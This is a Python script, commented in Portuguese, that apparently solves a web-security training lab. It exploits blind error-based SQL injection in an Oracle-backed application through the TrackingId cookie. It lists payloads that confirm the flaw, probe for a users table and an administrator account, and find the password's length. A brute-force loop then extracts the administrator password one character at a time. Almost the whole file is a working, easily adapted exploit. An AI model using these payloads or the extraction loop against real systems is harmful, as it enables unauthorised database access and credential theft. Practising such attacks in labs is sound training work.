''' 
BANCO DE DADOS:
A aplicação utiliza um BD Oracle, que exige que todas consultas SELECT especifiquem um nome de tabela, 
pode-se utilizar a tabela fictícia nativa do Oracle chamada 'dual', elapossui uma linha e uma coluna
APLICAÇÃO:
A aplicação não retorna respostas diferentes dependendo se a condição é Verdadeira ou Falsa,
mas retorna uma mensagem de erro quando ocorre algum erro no BD.
'''
# PARÂMETRO VULNERÁVEL: Cookies -> TrackingId

import requests

# PAYLOADS
# Verificando se a aplicação retorna a mesma resposta para condições diferentes
sqli_1 = "' AND '1'='1" # 200 OK
sqli_2 = "' AND '1'='2" # 200 OK
# Verificando se a aplicação retorna mensagem de erro para erro na sintaxe
sqli_3 = "'" # 500 Internal Server Error
sqli_4 = "''" # 200 OK
# Comprovando se o parâmetro é vulnerável a SQLi
sqli_5 = "'||(SELECT '' FROM dual)||'" # 200 OK
sqli_6 = "'||(SELECT '' FROM tabela_n_existe)||'" # 500 Internal Server Error
# Confirmando se existe a tabela users
sqli_7 = "'||(SELECT '' FROM users WHERE ROWNUM = 1)||'" # 200 OK
"""
Estrtura do SELECT CASE:
SELECT colunas,
    CASE 
        WHEN condição_1 THEN resultado_1
        WHEN condição_2 THEN resultado_2
        ELSE resultado_padrão
    END AS nome_coluna_resultados
FROM tabela
WHERE condição;
"""
# Confirmando se existe o usuário administrator
sqli_8 = "'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'" # 200 OK
sqli_9 = "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'" # 500 Internal Server Error
sqli_10 = "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" # 500 Internal Server Error - Existe usuário 'administrator' então executa o CASE
sqli_11 = "'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='admin999')||'" # 200 OK - Não existe usuário 'admin999' então a consulta não retorna nada
# Descobrindo a quantidade de caracteres da senha do usuário administrator
sqli_12 = "'||(SELECT CASE WHEN LENGTH(password)>15 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" # 500 Internal Server Error
sqli_13 = "'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" # 200 OK
sqli_14 = "'||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'" # 500 Internal Server Error

url = 'https://0a67003503a9990b837134c100be00f0.web-security-academy.net/'
# Request para os Payloads de sqli_1 até sqli_14
'''
cookies = {
    'TrackingId': 'onokEeS6UPIhyok4' + sqli_13,
}
response = requests.get(url, cookies=cookies)
print(response.status_code)
'''

# Sequência de requests para o payload sqli_15
caracteres = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']
password = []
for i in range(1,21): # Percorre de 1 a 20
    for j in caracteres:
        # Capturando caracteres da password do administrator 
        sqli_15 = "'||(SELECT CASE WHEN SUBSTR(password," + str(i) + ",1)='" + j + "' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        cookies = {
            'TrackingId': 'onokEeS6UPIhyok4' + sqli_15,
        }
        response = requests.get(url, cookies=cookies)
        if '500' in str(response.status_code):
            password.append(j)

print("Password: " + "".join(password))